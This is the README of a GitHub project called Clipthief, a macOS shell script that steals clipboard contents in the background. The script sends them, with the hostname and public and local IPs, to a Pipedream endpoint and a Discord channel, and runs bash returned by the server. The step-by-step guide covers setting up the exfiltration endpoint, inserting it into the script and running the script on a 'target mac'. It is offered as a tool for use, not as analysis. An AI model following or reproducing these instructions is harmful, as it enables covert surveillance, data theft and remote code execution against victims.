# Clipthief
A rudimentary shell script that waits in the background and steals clipboard data, posts it to a server (and executes the bash in the response), and sends the clipboard data, along with other useful info to a discord channel.

## How to use Cliptheif
1. Create an account with [Pipedream.com](https://www.pipedream.com/)
2. Clone [this](https://pipedream.com/@rhijjawi/clipthief-p_8rCK2Ox/) project
3. Deploy the project
4. Authenticate your Discord account with Pipedream and allow access to a server.
5. Paste the following text in the `steps.send_message_advanced`
-------------------------------------------------
Host Name --> {{event.body.localhostname}}
Local Time --> {{steps.trigger.context.ts}}
Public IP --> {{steps.trigger.event.client_ip}}
Local IP --> {{steps.trigger.event.body.localip}}
Clipboard Data --> {{event.body.clipboard}}
-------------------------------------------------
7. Copy the endpoint in the trigger called steps.trigger (https://xxxxxxxxxxxxx.m.pipedream.net)
8. Replace `REPLACE_ME` in [clipthief.sh](https://github.com/rhijjawi/Clipthief/blob/main/shell/clipthief.sh) with your endpoint
9. Copy the shell file to your target mac and execute it with `sudo ./clifthief.sh` or `./clipthief.sh` if the user does not have root privileges or the root password is unknown. 
10. Have fun (Copy something)
11. Open an issue if something doesn't work
